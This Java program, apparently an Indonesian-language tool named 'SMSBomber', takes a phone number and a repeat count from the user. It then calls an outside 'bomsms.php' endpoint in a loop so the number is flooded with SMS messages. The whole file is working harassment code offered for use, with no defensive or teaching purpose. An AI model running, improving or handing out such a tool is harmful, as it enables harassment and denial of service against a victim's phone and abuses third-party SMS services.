import java.util.Scanner;
import java.io.*;
import java.net.*;
public class Main {

	public static void main(String[] args) throws IOException{
		Scanner scan = new Scanner(System.in);
		String nomor = "", jumlah = "";
		double no = 0;
		int count = 0;
		start();
		
		do {
			System.out.print("[INPUT]> Nomor : 0");
			try {
				nomor = scan.nextLine();
				no = Double.parseDouble(nomor);
			}catch(Exception e) {
				nomor = "";
				System.out.println("[INFO]> Masukan Hanya Nomor ");
			}
		}while(nomor.isEmpty());
		
		do {
			System.out.print("[INPUT]> Jumlah : ");
			try {
				jumlah = scan.nextLine();
				count = Integer.parseInt(jumlah);
			}catch(Exception e) {
				jumlah = "";
				System.out.println("[Masukan Hanya Nomor]> ");
			}
		}while(jumlah.isEmpty());
		
		if(count < 1) {
			count = 1;
			System.out.println("[INFO]> Jumlah di Set 1");
		}
		for(int i = 0; i < count; i++) {
			try {
				kirimSms(nomor);
			}catch(IOException e) {
				System.out.println("[FAILED]> Tidak ada koneksi Internet");
				break;
			}
		}
		System.out.println("[INFO]> Bot Stop");
	}
	
	static void start() {
		System.out.println("========================[ Project ]========================");
		System.out.println("   _____ __  ________ ____                  __             \r\n" + 
				"  / ___//  |/  / ___// __ )____  ____ ___  / /_  ___  _____\r\n" + 
				"  \\__ \\/ /|_/ /\\__ \\/ __  / __ \\/ __ `__ \\/ __ \\/ _ \\/ ___/\r\n" + 
				" ___/ / /  / /___/ / /_/ / /_/ / / / / / / /_/ /  __/ /    \r\n" + 
				"/____/_/  /_//____/_____/\\____/_/ /_/ /_/_.___/\\___/_/     ");
		System.out.println("==================[ Author : AwaludinAR ]==================");
		System.out.println("=====================[ Version : 1.1 ]=====================");
	}
	
	private static void kirimSms(String nope) throws IOException{
		URL url = new URL("https://api.xaynet.id/bomsms.php?nomor="+ nope);
		String line;
		int rCode;
		HttpURLConnection berangkat = (HttpURLConnection) url.openConnection();
		rCode = berangkat.getResponseCode();
		if(rCode == HttpURLConnection.HTTP_OK) {
			BufferedReader br = new BufferedReader(new InputStreamReader(berangkat.getInputStream()));
			StringBuffer response = new StringBuffer();
			while ((line = br.readLine()) != null) {
				response.append(line);
			}
			br.close();
			System.out.println(response.toString());
		}else {
			System.out.println("[FAILED]> Tidak bisa terhubung ke Server");
		}
		
		
	}

}
